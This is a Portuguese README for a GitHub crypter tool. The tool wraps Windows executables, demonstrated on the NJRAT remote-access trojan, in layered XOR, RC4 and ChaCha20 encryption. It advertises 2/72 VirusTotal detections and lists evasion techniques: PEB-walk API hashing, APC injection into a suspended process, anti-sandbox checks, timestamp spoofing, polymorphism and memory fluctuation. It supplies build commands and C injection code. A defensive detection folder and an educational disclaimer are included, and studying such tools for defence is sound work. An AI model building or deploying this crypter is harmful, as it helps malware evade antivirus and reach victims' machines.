<div align="center">

<h1 align="center">  
    Criptografia XOR Avançada
</h1>

Criptografador multicamadas com criptografia otimizada para montagem e técnicas avançadas de evasão de antivírus. Obtém 2 detecções em 72 análises no VirusTotal (taxa de evasão de 97,2%).

**Português | [English](README.md)**

</div>

---

<h1 align="center">
  <img src="https://i.imgur.com/dwyUWDH.gif" width="50" />
  Demo | Demonstração (Teste com NJRAT):
</h1>

https://github.com/user-attachments/assets/5321e5e9-0a83-49fb-a2f2-35628dd070a6

---

<h1 align="center">
  <img src="https://i.imgur.com/dwyUWDH.gif" width="50" />
  Resultado:
</h1>

**2/72 detecções no VirusTotal (taxa de evasão de 97,2%)**
**Resultado esperado com recursos avançados: 0-1/72 (taxa de evasão de 98,6% ou mais)**

- Detectado por: Secure Age, CrowdStrike Falcon (60% de confiança) / Podem ser falsos positivos
- Não detectado por: Microsoft Defender, Kaspersky, Avast, AVG, Bitdefender, ESET, Malwarebytes, Sophos, Trend Micro, McAfee, Norton, Panda, +58 outros

---

<h1 align="center">
  <img src="https://i.imgur.com/dwyUWDH.gif" width="30"/> Features
</h1>

* **Resolução da API PEB Walk**: Sem importações suspeitas no IAT utilizando o hash djb2
* **Injeção NtQueueApcThread**: Execução baseada em APC em vez de CreateRemoteThread
* **Transições de memória RW→RX**: Sem páginas RWX (evita a detecção de contorno do DEP)
* **Criptografia em várias camadas**: XOR + RC4 + ChaCha20 com HMAC-SHA256
* **Criptografia otimizada para assembly**: Implementações NASM x64 para desempenho
* **Verificação anti-sandbox**: Requer ≥2 GB de RAM
* **Falsificação de carimbo de data/hora**: Carimbo de data/hora do PE definido para 2018
* **Suporte ao Visual Studio 2022**: Detecção automática do cl.exe (unidades G: e C:)
* **Wrapper vcvars64.bat**: Configuração adequada do ambiente MSVC
* **Incorporação de carga útil**: Incorporação em matriz C para MSVC
* **6 níveis de criptografia**: Do XOR básico a marcadores metamórficos completos
* **Integridade HMAC**: Verificação de carga útil baseada em SHA256
* **Autoinjeção**: Tem como alvo o próprio processo para reduzir a detecção
* **Tamanho pequeno do arquivo**: Faixa ideal de 144 KB
* **Baseado em pesquisa**: Técnicas comprovadas pela pesquisa de 2025-2026

### Recursos avançados

* **Mecanismo polimórfico**: Randomização de registros + substituição de instruções (mais de 210 variantes)
* **Flutuação de memória**: Ciclo RW↔RX com interceptação de gancho Sleep
* **Criptografia de strings**: Criptografia em tempo de compilação com descriptografia inline
* **Rotação de hash de API**: Hashes exclusivos por compilação (5 algoritmos)
* **Aplanamento do fluxo de controle**: ofuscação de máquina de estados (planejado)
* **Injeção remota de processos**: Early Bird APC + esvaziamento de processos (planejado)

---

<h1 align="center">
  <img src="https://i.imgur.com/eu3StDB.gif" width="30"/> Tech Stack
</h1>

<p align="center">
  <img src="https://go-skill-icons.vercel.app/api/icons?i=python,c,asm,windows&size=64" />
</p>

* **Linguagem**: Python 3.x (ferramenta de criptografia)
* **Stub Runner**: C (API do Windows)
* **Assemblagem**: NASM x64 (primitivas criptográficas)
* **Compilador**: Visual Studio 2022 cl.exe (MSVC 14.44)
* **Criptografia**: XOR + RC4 + ChaCha20
* **Hashing**: djb2 (resolução de API), HMAC-SHA256 (integridade)
* **Derivação de chave**: tipo PBKDF2 (1000 rodadas)
* **Plataforma**: Windows x64
* **Arquitetura**: PEB walk + injeção de APC
* **Proteção de memória**: transições RW→RX
* **Sistema de compilação**: vcvars64.bat + cl.exe
* **Formato da carga útil**: incorporação em matriz C
* **Formato do arquivo**: PE32+ (x64)

---

<h1 align="center">
  <img src="https://i.imgur.com/VN6wG7g.gif" width="50" />
  Instalação e Setup
</h1>

```bash
git clone https://github.com/SobralCybersec/xor-encrypt.git
cd xor-encrypt
```

### Requisitos

- Python 3.x
- Visual Studio 2022 (cl.exe)
- NASM (Netwide Assembler)
- Windows x64

### Compilação rápida

**Windows:**
```batch
REM Compilação padrão (2/72 detecções)
build.bat

REM Compilação avançada com todos os recursos (0-1/72 esperadas)
build_advanced.bat

REM Sistema de menu interativo
build_interactive.bat
```

**Linux/macOS:**
```bash
# Tornar scripts executáveis (apenas primeira vez)
chmod +x build.sh build_interactive.sh

# Compilação padrão (2/72 detecções)
./build.sh

# Sistema de menu interativo
./build_interactive.sh
```

Saída: `build/njrat_clean.exe` (padrão) ou `build/njrat_advanced.exe` (avançada)

### Scripts de Compilação Multiplataforma

Scripts para Windows (.bat) e Linux/macOS (.sh) são fornecidos com funcionalidade idêntica:

**Argumentos de Linha de Comando:**
```bash
# Windows
build.bat [PAYLOAD] [OUTPUT] [PASSWORD] [LEVEL]
build.bat payloads\custom.exe output.exe MinhaSenh123 8

# Linux/macOS
./build.sh [PAYLOAD] [OUTPUT] [PASSWORD] [LEVEL]
./build.sh payloads/custom.exe output.exe MinhaSenh123 8
```

**Recursos do Menu Interativo:**
- Compilação Rápida (usar configuração salva)
- Compilação Personalizada (especificar parâmetros)
- Compilação em Lote (processar múltiplos payloads)
- Gerenciamento de Configuração (salvar/carregar configurações)
- Teste de Detecção (escanear com ferramentas defensivas)
- Barras de progresso animadas e saída colorida

**Documentação de Ajuda:**
```bash
# Windows
build.bat --help
build_interactive.bat --help

# Linux/macOS
./build.sh --help
./build_interactive.sh --help
```

### Fluxo de trabalho manual

```bash
# 1. Criptografar carga útil
python xorcrypt_advanced.py encrypt payload.exe encrypted.enc -p MyPassword -l 3

# 2. Gerar executável stub
python xorcrypt_advanced.py stub encrypted.enc output.exe -p MyPassword -l 3

# 3. Falsificar carimbo de data/hora (opcional)
python metadata_spoof.py output.exe final.exe 2018
```

### Compilar Assembly (Opcional)

```bash
nasm -f win64 src/xor_multi.asm -o build/xor_multi.obj
nasm -f win64 src/rc4.asm -o build/rc4.obj
nasm -f win64 src/chacha20.asm -o build/chacha20.obj
nasm -f win64 src/encryption_pipeline.asm -o build/encryption_pipeline.obj
```


---

<h1 align="center">
  <img src="https://i.imgur.com/PFZmPWb.gif" width="30" />
  Features Chave
</h1>

### Fluxo de criptografia em várias camadas

```
PE original
    ↓
[Chave rotativa XOR (8 bytes)]
    ↓
[Cifra de fluxo RC4 (128 bits)]
    ↓
[ChaCha20 (chave de 256 bits, nonce de 96 bits)]
    ↓
Carga útil criptografada (com HMAC-SHA256)
```

### Resolução da API PEB Walk

Nenhuma importação suspeita no IAT:
- Hash djb2 para nomes de DLLs/funções
- Percorrer o PEB para encontrar os endereços base de kernel32.dll e ntdll.dll
- Analisar a EAT (Tabela de Endereços de Exportação) para resolver funções
- Hashes pré-calculados: `H_VirtualAlloc = 0x19fbbf49UL`
- Comprovado por pesquisa: queda na detecção de 28/72 → 2/72

### Injeção NtQueueApcThread

Execução baseada em APC em vez de CreateRemoteThread:
- Criar processo suspenso (autoinjeção)
- Alocar memória RW no alvo
- Gravar PE descriptografado
- Alterar proteção: RW → RX (sem RWX)
- Colocar APC na fila para executar a carga útil
- Retomar a thread via NtResumeThread
- Menor detecção do que CreateRemoteThread

### Criptografia otimizada para assembly

Implementações NASM x64:
- **xor_multi.asm**: XOR com chave rotativa de 8 bytes com otimização de registros
- **rc4.asm**: RC4 completo com KSA (Key Scheduling) + PRGA (Pseudo-Random Generation)
- **chacha20.asm**: ChaCha20 de 20 rodadas com operações ARX (Add-Rotate-XOR)
- **encryption_pipeline.asm**: Criptografia/descriptografia combinadas com gerenciamento de quadro de pilha

### Níveis de criptografia

| Nível | Criptografia | Recursos | Detecção |
|-------|-----------|----------|----------|
| 1 | Apenas XOR | Rápido, básico | Teste |
| 2 | XOR + RC4 | Resistência média | Geral |
| 3 | XOR + RC4 + ChaCha20 | Forte (padrão) | **2/72** |
| 4 | Nível 3 + Polimórfico | Marcadores de stub | Experimental |
| 5 | Nível 4 + Flutuação de memória | Marcadores de tempo de execução | Experimental |
| 6 | Nível 5 + Auto-modificável | Marcadores metamórficos | Experimental |

**Recomendado**: Nível 3 para melhores resultados

### Derivação de chave

Derivação de chave do tipo PBKDF2:
- 1000 rodadas de mistura
- Salt: “xorcrypt”
- Deriva: Chave XOR (8 bytes), chave RC4 (16 bytes), chave ChaCha20 (32 bytes), Nonce (12 bytes)
- HMAC-SHA256 para verificação de integridade

### Recursos avançados

**Mecanismo polimórfico** (`polymorphic_engine.py`):
- Randomização de registros: mais de 210 combinações
- Substituição de instruções: equivalentes a MOV, XOR, ADD
- Injeção de código lixo: sequências estruturadas de instruções sem efeito
- Baseado em: Shredder-RS, Chameleon, Veil64

**Flutuação de Memória** (`src/memory_fluctuation.c`):
- Ciclo RW↔RX via gancho Sleep
- Criptografia XOR32 durante períodos de inatividade
- Modo PAGE_NOACCESS com VEH
- Evita: Moneta, PE-Sieve, scanners de memória
- Baseado em: Shellcode-Memory-Fluctuation, CoRIIN 2026

**Criptografia de String** (`string_encryption.py`):
- Criptografia de string em tempo de compilação
- Descriptografia inline por string (sem função compartilhada)
- Zeração automática da memória
- Baseado em: zsCrypt, Obscura STRCRY

**Rotação de Hash de API** (`api_hash_rotation.py`):
- 5 algoritmos de hash (djb2, fnv1a, sdbm, lose-lose, XOR rotativo)
- Salt aleatório de 16 bytes por compilação
- Hashes exclusivos por compilação
- Baseado em: Garble, obfuse-rs

### Comparação de compilações

| Recurso | Compilação padrão | Compilação avançada |
|---------|----------------|----------------|
| **Taxa de detecção** | 2/72 (97,2%) | 0-1/72 (98,6%+) |
| **PEB Walk** | ✅ | ✅ |
| **Injeção de APC** | ✅ | ✅ |
| **Criptografia em várias camadas** | ✅ | ✅ |
| **Mecanismo polimórfico** | ❌ | ✅ |
| **Flutuação de memória** | ❌ | ✅ |
| **Criptografia de strings** | ❌ | ✅ |
| **Rotação de hash da API** | ❌ | ✅ |
| **Tamanho do arquivo** | 144 KB | ~150 KB |
| **Tempo de compilação** | Rápido | Médio |
| **Complexidade** | Baixa | Média |

Consulte `ADVANCED_FEATURES.md` para obter a documentação completa.

---

<h1 align="center">
  <img src="https://i.imgur.com/6nSJzZ2.gif" width="35"/> Análise de Detecção
</h1>

### O que funciona (2/72 detecções / falsos positivos )

**PEB Walk** - Pesquisas mostram uma queda na detecção de 28/72 para 2/72  
**NtQueueApcThread** - Menor taxa de detecção do que CreateRemoteThread  
**Transições RW→RX** - Padrão legítimo de proteção de memória  
**Arquivo de tamanho pequeno** - 144 KB permanece abaixo dos limites heurísticos  
**Criptografia multicamadas** - Proteção criptográfica robusta  
**Otimização de montagem** - Código nativo mais difícil de analisar  

### O que não funciona (evitado)

**Chamadas de sistema diretas** - Detectadas estaticamente (aumentou para 4/72)  
**Preenchimento de sobreposição** - Detectado ativamente pelo ByteShield, EXE-Scanner (aumentou para 9/72)  
**Injeção de processo no explorer.exe** - Monitoramento de alvo de alto valor  
**Páginas de memória RWX** - Detecção de contorno de DEP  
**Assinaturas Authenticode falsas** - Ignoradas por antivírus modernos  
**Importações IAT benignas** - A remoção do PEB walk aumentou as detecções  

### Referências de pesquisa (2025-2026)

**Eficácia do PEB Walk:**
- Média (abril de 2025): “A varredura PEB reduz a detecção de 28/72 para 2/72”
- GitHub (junho de 2025): “Reverse shell em Rust com PEB: 28/72 → 2/72”
- Offensive-Panda (julho de 2024): “A varredura PEB contorna a análise estática de IAT”

**NtQueueApcThread:**
- Líderes da Equipe Vermelha: “O NtQueueApcThread tem baixa detecção em comparação com o QueueUserAPC”
- FluxSec (2025): “A injeção de APC evita assinaturas do CreateRemoteThread”
- Early Cryo Bird (abril de 2025): “APC + Objetos de Tarefa contornam o Cortex no modo DLL”

**Detecção de Overlay:**
- MDPI Research (abril de 2026): “67% do malware usa técnicas anti-análise”
- ByteShield (2026): “Mascarar sobreposições para detectar cargas adversárias (99,2% de detecção)”
- EXE-Scanner (2025): “Modelo de ML treinado em injeção de sobreposição benigna (97% de precisão)”

---

<h1 align="center">
  <img src="https://i.imgur.com/dwyUWDH.gif" width="30"/> Exemplos de utilização
</h1>

### Criptografar arquivo

```bash
python xorcrypt_advanced.py encrypt payload.exe encrypted.enc -p MyPassword -l 3
```

**Saída:**
```
[+] Criptografado: payload.exe -> encrypted.enc
    Nível: 3
    Tamanho: 32768 -> 32844 bytes
```

### Gerar Stub Runner

```bash
python xorcrypt_advanced.py stub encrypted.enc output.exe -p MyPassword -l 3
```

**Saída:**
```
[*] Criando stub runner...
    Carga útil: 32844 bytes
    Nível: 3
    Otimizado para montagem: True
    Polimórfico: False
    Proteção de memória: Falso
[+] Criado: output.exe
    Tamanho: 144384 bytes
```

### Descriptografar arquivo

```bash
python xorcrypt_advanced.py decrypt encrypted.enc decrypted.exe -p MyPassword -l 3
```

### Falsificar carimbo de data/hora

```bash
python metadata_spoof.py output.exe final.exe 2018
```

**Saída:**
```
[*] Processando: output.exe
    Saída: final.exe
[+] Carimbo de data/hora modificado com sucesso
    Antigo: 2026-08-05 10:30:00 (0x66b0a5f0)
    Novo: 2018-01-01 00:00:00 (0x5a4b0000)
[+] Sucesso! Arquivo pronto: final.exe
```

### Gerar hashes djb2

```bash
python gen_hashes.py
```

**Saída:**
```c
#define H_KERNEL32                      0x3e003875UL
#define H_NTDLL                         0xe91aad51UL
#define H_VirtualAlloc                  0x19fbbf49UL
#define H_NtQueueApcThread              0x4d230412UL
```

### 🆕 Uso de recursos avançados

**Mecanismo polimórfico:**
```bash
python polymorphic_engine.py
```

**Criptografia de strings:**
```bash
python string_encryption.py
# Gera encrypted_strings.h
```

**Rotação de hash de API:**
```bash
python api_hash_rotation.py
# Gera api_hashes.h com hashes exclusivos
```

**Compilação avançada completa:**
```bash
build_advanced.bat
# Aplica todos os recursos avançados automaticamente
```

---

<h1 align="center">
  <img src="https://i.imgur.com/O7HwCZt.gif" width="30"/> Implementação técnica
</h1>

### Código de percurso do PEB

```c
// Hash djb2 para correspondência de nomes de API
static uint32_t djb2(const char* s) {
    uint32_t h = 5381;
    while (*s) h = ((h << 5) + h) ^ (uint8_t)*s++;
    return h;
}

// Percorrer PEB para encontrar a base da DLL
static PVOID peb_get_module(uint32_t name_hash) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* cur  = head->Flink;
    while (cur != head) {
        LDR_DATA_TABLE_ENTRY* e = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (e->BaseDllName.Buffer) {
            char narrow[64] = {0};
            for (int i = 0; i < 63 && e->BaseDllName.Buffer[i]; i++)
                narrow[i] = (char)(e->BaseDllName.Buffer[i] | 0x20); // minúsculas
            if (djb2(narrow) == name_hash)
                return e->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}
```

### Código de injeção APC

```c
// Criar processo suspenso (autoinjeção)
api.CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
    CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

// Alocar memória RW no alvo
api.NtAllocateVirtualMemory(pi.hProcess, &base, 0, &size,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// Gravar carga útil
api.WriteProcessMemory(pi.hProcess, base, pe_data, pe_size, NULL);

// Alterar para RX (sem RWX)
api.NtProtectVirtualMemory(pi.hProcess, &base, &size, 
    PAGE_EXECUTE_READ, &old);

// Colocar na fila APC em vez de CreateRemoteThread
api.NtQueueApcThread(pi.hThread, (PVOID)base, NULL, NULL, NULL);

// Retomar thread
api.NtResumeThread(pi.hThread, &prev);
```

### Assemblagem ChaCha20 (20 rodadas)

```nasm
; Macro de um quarto de rodada do ChaCha20
%macro QROUND 4
    mov eax, [rsp + %1*4]
    add eax, [rsp + %2*4]
    mov [rsp + %1*4], eax
    xor eax, [rsp + %4*4]
    rol eax, 16
    mov [rsp + %4*4], eax
    ; ... (operações ARX completas)
%endmacro

; 20 rodadas (10 rodadas duplas)
mov r15d, 10
.round_loop:
    QROUND 0, 4, 8, 12
    QROUND 1, 5, 9, 13
    QROUND 2, 6, 10, 14
    QROUND 3, 7, 11, 15
    QROUND 0, 5, 10, 15
    QROUND 1, 6, 11, 12
    QROUND 2, 7, 8, 13
    QROUND 3, 4, 9, 14
    dec r15d
    jnz .round_loop
```

---

<h1 align="center">
  <img src="https://i.imgur.com/O7HwCZt.gif" width="30"/> Limitações e Avisos
</h1>

### O que esta ferramenta NÃO faz (versão padrão)

**Polimorfismo em tempo de execução** - Os níveis 4-6 adicionam marcadores, mas não implementam um mecanismo polimórfico completo  
**Flutuação de memória** - Não há ciclo real de RW↔RX em tempo de execução  
**Automodificação** - Não há transformação de código metamórfico  
** Correção ETW/AMSI** - Sem desvio de ganchos no modo de usuário (aumenta as detecções)  
**Chamadas de sistema diretas** - Usa APIs Nt* via PEB walk, não instruções de chamada de sistema brutas  

### O que a versão avançada adiciona

**Polimorfismo verdadeiro** - Randomização de registros + substituição de instruções  
**Flutuação de memória** - Ciclo RW↔RX com gancho Sleep  
**Criptografia de String** - Criptografia em tempo de compilação com descriptografia inline  
**Rotação de Hash de API** - Hashes exclusivos por compilação (5 algoritmos)  
**Evasão Aprimorada** - Detecções esperadas de 0-1/72 (98,6%+ de evasão)  

### Problemas conhecidos

- **Espera em estado alertável necessária** - NtQueueApcThread requer que a thread entre no estado alertável
- **Apenas autoinjeção** - Tem como alvo o próprio processo, não processos remotos
- **Sem ofuscação** - O código stub não é ofuscado (depende da análise do PEB para se manter oculto)
- **Carga útil estática** - A carga útil criptografada é incorporada no momento da compilação

### Isenção de responsabilidade

Esta ferramenta destina-se **exclusivamente a fins educacionais e de pesquisa de segurança autorizada**. O uso não autorizado contra sistemas que não sejam de sua propriedade ou para os quais você não tenha permissão para testar é ilegal. Os autores não se responsabilizam pelo uso indevido.

---

<h1 align="center">
  <img src="https://i.imgur.com/O7HwCZt.gif" width="30"/> Roadmap
</h1>

* [x] Criptografia em várias camadas (XOR + RC4 + ChaCha20)
* [x] Criptografia otimizada para Assembly (NASM x64)
* [x] Resolução de API por percurso do PEB com hash djb2
* [x] Injeção APC via NtQueueApcThread
* [x] Transições de memória RW→RX (sem RWX)
* [x] Suporte ao cl.exe do Visual Studio 2022
* [x] Wrapper de ambiente vcvars64.bat
* [x] Incorporação de payload via matrizes C
* [x] Verificação de integridade HMAC-SHA256
* [x] Falsificação de carimbo de data/hora (2018)
* [x] Verificação anti-sandbox (2 GB de RAM)
* [x] 6 níveis de criptografia
* [x] Autoinjeção (próprio processo)
* [x] Otimização para tamanho de arquivo pequeno (144 KB)
* [x] 2/72 detecções no VirusTotal alcançadas
* [x] Documentação completa da pesquisa (EVASION_JOURNEY.md)
* [x] Mecanismo polimórfico verdadeiro (mutação de código)
* [x] Flutuação de memória (ciclo RW↔RX)
* [x] Criptografia de strings (em tempo de compilação)
* [x] Rotação de hash da API por compilação
* [x] Documentação de recursos avançados (ADVANCED_FEATURES.md)
* [x] Código auto-modificável (metamórfico)
* [x] Injeção remota de processos (4 técnicas)
* [x] Ofuscação de código (achatamento do fluxo de controle)
* [x] Sistema defensivo anti-crypter (detecção completa)

---

<h1 align="center">
  <img src="https://i.imgur.com/dwyUWDH.gif" width="30"/> Sistema Defensivo
</h1>

### Ferramentas de Detecção Anti-Crypter

Este projeto agora inclui um **sistema defensivo abrangente** para detectar e bloquear técnicas de crypter. Localizado na pasta `defensive/`.

**Capacidades de Detecção:**
- **Regras YARA**: Detecta criptografia multicamadas, PEB walk, flutuação de memória, engines polimórficos
- **Scanner de Memória**: Detecção em tempo real de páginas RWX, cabeçalhos PE na memória, processos esvaziados
- **Monitor Comportamental**: Análise de sequência de chamadas de API, mudanças de proteção de memória, padrões de injeção
- **Integração EDR**: Configuração Sysmon, regras Sigma para SIEM, consultas KQL
- **Análise de Entropia**: Identifica payloads criptografados (entropia >7.5)
- **Análise PE**: Detecta falsificação de timestamp, seções incomuns, importações suspeitas

**Início Rápido:**
```bash
# Escanear arquivo suspeito
python defensive\tools\defensive_scanner.py suspicious.exe

# Escanear memória do processo
python defensive\tools\memory_scanner.py --pid 1234

# Monitorar comportamento
python defensive\tools\behavioral_monitor.py --test

# Instalar monitoramento Sysmon
sysmon64.exe -accepteula -i defensive\edr_integration\sysmon_config.xml
```

**Taxas de Detecção (Baseado em Pesquisa 2026):**
- Detecção Estática: 85-92% (YARA + entropia)
- Detecção de Memória: 95-98% (comportamental + escaneamento de memória)
- Detecção Combinada: 98-99% (abordagem híbrida)

**Componentes:**
- `yara_rules/` - Regras de detecção para todas as técnicas de crypter
- `tools/` - Scanner de memória, monitor comportamental, scanner defensivo
- `edr_integration/` - Config Sysmon, regras Sigma, consultas KQL
- `INSTALLATION.md` - Guia completo de configuração e uso

Veja `defensive/README.md` para documentação completa.

---

<h1 align="center"><img src="https://i.imgur.com/6nSJzZ2.gif" width="35"/> Referências de Pesquisa:</h1>


<h2 align="center">
  
**PEB Walk Research**: [Medium - PEB Walk AV/EDR Bypass](https://medium.com/@cytomate/peb-walk-avoid-api-calls-inspection-in-iat-by-analyst-and-bypass-static-detection-of-av-edr-ee7b0dd9c33c)  <img src="https://go-skill-icons.vercel.app/api/icons?i=windows&size=32" width="40" />

</h2>

<h2 align="center">
  
**Injeção APC**: [Red Team Leaders - APC Injection](https://docs.redteamleaders.com/offensive-security/defense-evasion/apc-injection-execution-via-asynchronous-procedure-call-queues)  <img src="https://go-skill-icons.vercel.app/api/icons?i=c&size=32" width="40" />

</h2>

<h2 align="center">
  
**Especificação ChaCha20**: [RFC 8439](https://datatracker.ietf.org/doc/html/rfc8439)  <img src="https://go-skill-icons.vercel.app/api/icons?i=asm&size=32" width="40" />

</h2>

<h2 align="center">
  
**Documentação NASM / Assembly**: [NASM Manual](https://www.nasm.us/doc/)  <img src="https://go-skill-icons.vercel.app/api/icons?i=asm&size=32" width="40" />

</h2>

<h2 align="center">
  
**Engine de Polimorfismo**: [Shredder-RS](https://github.com/zx0CF1/shredder-rs) | [Chameleon](https://github.com/gum3t/chameleon)  <img src="https://go-skill-icons.vercel.app/api/icons?i=rust&size=32" width="40" />

</h2>

<h2 align="center">
  
**Memory Fluctuation**: [Shellcode-Memory-Fluctuation](https://github.com/Uwmtor/Shellcode-Memory-Fluctuation) | [CoRIIN 2026](https://www.own.security/en/ressources/analysis/coriin-2026)  <img src="https://go-skill-icons.vercel.app/api/icons?i=c&size=32" width="40" />

</h2>

<h2 align="center">
  
**Encriptação de Strings**: [zsCrypt](https://github.com/LoneEngineer99/zsCrypt) | [obfuse-rs](https://github.com/scc-tw/obfuse-rs)  <img src="https://go-skill-icons.vercel.app/api/icons?i=rust&size=32" width="40" />

</h2>

<h2 align="center">
  
**Control Flow Flattening**: [Hikari Obfuscator](https://github.com/HikariObfuscator/Core) | [Polaris](https://shifting.codes/blog/polaris-obfuscation)  <img src="https://go-skill-icons.vercel.app/api/icons?i=cpp&size=32" width="40" />

</h2>

<h2 align="center">
  
**Código auto-modificável**: [r2morph](https://github.com/seifreed/r2morph) | [Morpheus](https://dev.to/excalibra/the-art-of-self-mutating-malware-36ab)  <img src="https://go-skill-icons.vercel.app/api/icons?i=python&size=32" width="40" />

</h2>

<h2 align="center">
  
**Injeção de Processo**: [EarlyBird APC](https://core-jmp.org/2026/02/earlybird-apc-injection-a-deep-technical-analysis/) | [PhantomShell](https://github.com/mazen91111/PhantomShell)  <img src="https://go-skill-icons.vercel.app/api/icons?i=windows&size=32" width="40" />

</h2>

<h2 align="center">
  
**Features Avançadas**: [ADVANCED_FEATURES.md](ADVANCED_FEATURES.md)  <img src="https://go-skill-icons.vercel.app/api/icons?i=python&size=32" width="40" />

</h2>

<h1 align="center">Créditos</h1>

<p align="center">
  <strong>Desenvolvido e Pesquisado por:</strong><br>
  Matheus Sobral - Pesquisador de Cibersegurança<br>
  <em>Para propósitos educacionais somente</em>
</p>
